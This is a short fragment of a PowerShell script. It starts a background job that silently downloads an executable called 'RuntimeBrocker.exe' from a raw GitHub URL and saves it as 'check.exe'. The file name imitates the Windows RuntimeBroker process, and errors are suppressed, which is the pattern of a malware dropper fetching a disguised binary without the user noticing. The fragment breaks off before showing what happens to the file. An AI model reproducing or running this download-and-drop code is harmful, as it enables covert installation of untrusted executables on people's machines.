...
Start-Job -ScriptBlock {
    param($f)
    Invoke-WebRequest -Uri "https://github.com/kulebykahokage-cell/check/raw/refs/heads/main/RuntimeBrocker.exe" -OutFile "$f\check.exe" -ErrorAction SilentlyContinue
